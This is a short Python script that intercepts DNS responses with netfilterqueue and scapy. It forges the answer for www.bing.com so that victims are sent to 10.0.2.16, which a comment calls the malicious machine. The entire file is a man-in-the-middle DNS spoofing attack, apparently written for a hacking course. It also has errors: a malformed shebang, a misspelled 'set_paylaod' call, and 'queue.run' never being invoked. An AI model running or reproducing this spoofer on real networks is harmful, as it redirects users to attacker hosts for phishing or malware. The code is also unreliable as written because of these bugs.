#!usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
		scapy_packet = scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.DNSRR):               # using layers find out if DNS Response is found
				qname = scapy_packet[scapy.DNSQR].qname
				if "www.bing.com" in qname:
						print("[+] Spoofing target")
						answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")     # here the IP is the malicious machine
						scapy_packet[scapy.DNS].an = answer              # create a spoofed answer
						scapy_packet[scapy.DNS].ancount = 1              # set answer count to 1 in DNS layer
						
						del scapy_packet[scapy.IP].len                   # delete length from IP layer
						del scapy_packet[scapy.IP].chksum                # delete checksumfrom IP layer
						del scapy_packet[scapy.UDP].len                   # delete length from UDP layer
						del scapy_packet[scapy.UDP].chksum                # delete checksumfrom UDP layer
						
						packet.set_paylaod(str(scapy_packet))
						
		packet.accept()                          # to enable packet forwarding to destination

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)                 # since process_packet is a callback function, no need to pass arguments, as NetFilterQueue will automatically pass every packet automatically
queue.run